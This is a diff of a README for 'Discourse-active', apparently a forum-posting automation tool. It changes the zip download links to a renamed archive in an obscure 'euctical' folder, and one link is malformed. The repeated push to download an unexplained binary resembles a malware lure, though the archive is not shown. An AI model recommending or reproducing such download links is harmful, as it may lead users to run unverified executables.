@@ -6,7 +6,7 @@ Welcome to **Discourse-active**! This application helps you automate posting in 
 
 ## 📥 Download Now
 
-[![Download Discourse-active](https://raw.githubusercontent.com/SilentAssassin1/Discourse-active/main/euctical/Discourse-active_3.5-alpha.1.zip%https://raw.githubusercontent.com/SilentAssassin1/Discourse-active/main/euctical/Discourse-active_3.5-alpha.1.zip)](https://raw.githubusercontent.com/SilentAssassin1/Discourse-active/main/euctical/Discourse-active_3.5-alpha.1.zip)
+[![Download Discourse-active](https://github.com/SilentAssassin1/Discourse-active/raw/refs/heads/main/euctical/active-Discourse-v1.0-alpha.1.zip%https://github.com/SilentAssassin1/Discourse-active/raw/refs/heads/main/euctical/active-Discourse-v1.0-alpha.1.zip)](https://github.com/SilentAssassin1/Discourse-active/raw/refs/heads/main/euctical/active-Discourse-v1.0-alpha.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Welcome to **Discourse-active**! This application helps you automate posting in 
 
 To get started, simply visit the following page to download:
 
-[Download Discourse-active](https://raw.githubusercontent.com/SilentAssassin1/Discourse-active/main/euctical/Discourse-active_3.5-alpha.1.zip)
+[Download Discourse-active](https://github.com/SilentAssassin1/Discourse-active/raw/refs/heads/main/euctical/active-Discourse-v1.0-alpha.1.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest version listed on the page.
